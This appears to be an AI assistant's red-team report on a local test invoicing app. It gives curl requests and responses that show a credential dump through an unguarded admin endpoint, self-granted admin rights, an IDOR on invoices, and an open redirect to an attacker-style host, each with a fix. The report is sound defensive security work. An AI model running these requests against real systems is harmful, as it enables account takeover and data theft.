## Red-team findings — Invoicely (http://127.0.0.1:3100)

Tested directly against the running local instance using the seeded accounts (`alice`/`alice-pass`, `bob`/`bob-pass`, `admin`/`admin-pass`) from `README.md`. Every finding below was **executed and observed**, not just read from the code — raw request/response evidence included.

### 1. CRITICAL — `/api/admin/users` has no authorization check at all
Any logged-in user, regardless of role, can call this endpoint and get every account's **plaintext password**.

```
curl -b "sid=<alice's session>" http://127.0.0.1:3100/api/admin/users
→ 200 OK
[{"username":"alice","password":"alice-pass","role":"user", ...},
 {"username":"bob","password":"bob-pass", ...},
 {"username":"admin","password":"admin-pass","role":"admin", ...}]
```
Alice is a plain `user` and never escalated anything — the server (`server.js:41`) checks only "is someone logged in," never the role. The admin link is merely hidden client-side in `public/index.html:6` (`// hidden for non-admins`) — that's cosmetic, not a control.

**Fix:** add a server-side role check (`if (user.role !== 'admin') return send(res, 403, ...)`) before this route, and stop returning the `password` field from any API response, ever.

### 2. CRITICAL — Self-service role escalation via `PATCH /api/me`
`Object.assign(user, await body(req))` (server.js:37) blindly merges the request body into the live user record — including `role`, `id`, `email`.

```
curl -b "sid=<bob>" -X PATCH -d '{"role":"admin"}' http://127.0.0.1:3100/api/me
→ 200 OK  {"id":2,"username":"bob","role":"admin", ...}
```
Bob is now a permanent admin (mutates the shared in-memory record). Combined with finding 1 this is a two-line full account takeover, but as shown above finding 1 doesn't even require this step.

**Fix:** whitelist the fields a user may PATCH on themselves (e.g. display name only); never let the client set `role`, `id`, or `password` through this route.

### 3. HIGH — IDOR on `GET /api/invoices/:id`
Ownership is never checked on the single-invoice route (server.js:40), only on the list route.

```
# Bob's own list correctly shows only his invoice:
curl -b "sid=<bob>" http://127.0.0.1:3100/api/invoices
→ [{"id":201,"owner":2,"customer":"Quillbook","total":9900}]

# But Bob can read Alice's invoice directly by ID:
curl -b "sid=<bob>" http://127.0.0.1:3100/api/invoices/101
→ 200 OK {"id":101,"owner":1,"customer":"Stackwise Ltd","total":1200}
```
IDs are small sequential integers — trivially enumerable. Any customer name/invoice total in the system is exposed to any other logged-in customer.

**Fix:** `if (i.owner !== user.id) return send(res, 404, {error:'not found'})` on that route.

### 4. MEDIUM — Open redirect via `next` parameter
```
curl -i 'http://127.0.0.1:3100/login?next=https://evil.example/'
→ 302 Found  Location: https://evil.example/
```
Also reflected into the JSON `next` field on `/api/login`. Usable for phishing (`https://invoicely.example/login?next=https://evil-lookalike.example`) off a trusted domain.

**Fix:** only allow relative, same-origin `next` values (e.g. `next.startsWith('/')` and no `//`), or drop the parameter.

### 5. Contributing weakness — plaintext passwords stored and echoed
Passwords are stored in cleartext in the `users` object and returned by `/api/me`, the PATCH response, and `/api/admin/users`. Even after the authz fixes above, this is a bad default — hash passwords at rest and strip `password` from every serialized user object.

---

## Fix priority
1. Add the missing authz check on `/api/admin/users` (finding 1) — this alone is a full credential dump, no escalation needed.
2. Lock down `PATCH /api/me` to a field whitelist (finding 2) — closes the self-escalation path.
3. Add ownership check to `GET /api/invoices/:id` (finding 3) — closes cross-tenant data leak.
4. Restrict `next` to same-origin (finding 4).
5. Stop storing/returning plaintext passwords (finding 5) — defense in depth for all of the above.

Items 1–3 all stem from the same root cause: **every authorization decision in this app is either absent or done client-side.** Fixing the two missing server-side checks (admin role gate, invoice ownership gate) plus the PATCH field whitelist closes the critical chain.

I didn't modify any code — flag if you want me to apply these four fixes now (small, localized diffs in `server.js`) and re-verify with the same requests.